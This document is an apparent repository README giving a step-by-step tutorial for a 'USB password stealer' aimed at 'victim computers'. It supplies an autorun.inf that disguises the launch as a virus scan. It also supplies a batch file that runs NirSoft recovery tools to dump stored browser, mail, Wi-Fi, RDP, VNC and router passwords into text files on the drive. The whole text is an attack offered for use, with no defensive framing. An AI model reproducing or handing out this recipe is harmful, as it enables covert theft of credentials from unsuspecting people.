# auto-usb-stealer
In this tutorial we show how to create a USB password Stealer. It is a simple trick and it help you to retirve all the password stored in the browsers of victim computers.

All you need to create is a AUTORUN.inf and LAUNCH.bat file. before stating we need to download some tools and to be placed in your pen-drive.

You can download the following tools from nirsoft.

MessenPass
Mail PassView
Protected Storage PassView
Dialupass
BulletsPassView
Network Password Recovery
SniffPass Password Sniffer
RouterPassView
PstPassword
WebBrowserPassView
WirelessKeyView
Remote Desktop PassView
VNCPassView

Also Read USBStealer – Password Hacking Tool For Windows Machine Applications

Tutorial – USB password Stealer
1. Open a notepad and add the following

[AUTORUN]

OPEN=LAUNCH.BAT

ACTION= PERFORM A VIRUS SCAN
2. Save the text file as autorun.inf

3. Open a new text file and paste the following

start mspass.exe /stext mspass.txt
start mailpv.exe /stext mailpv.txt<br>start pspv.exe /stext pspv.txt
start Dialupass.exe /stext Dialupass.txt
start BulletsPassView.exe /stext BulletsPassView.txt
start netpass.exe /stext netpass.txt
start sniffpass.exe /stext sniffpass.txt
start RouterPassView.exe /stext RouterPassView.txt
start PstPassword.exe /stext PstPassword.txt
start WebBrowserPassView.exe /stext WebBrowserPassView.txt
start WirelessKeyView.exe /stext WirelessKeyView.txt
start rdpv.exe /stext rdpv.txt
start VNCPassView.exe /stext VNCPassView.txt
4. Save the file as LAUNCH.BAT, so it will run the tools together.

Also Read Top 5 Free Hacking App For Android Phones

5. Copy the downloaded files, autorun.inf and LAUNCH.BAT to USB drive.

6. Plug the USB to victim computer and launch.bat file

It will do the rest of things and fetches the username and passwords.
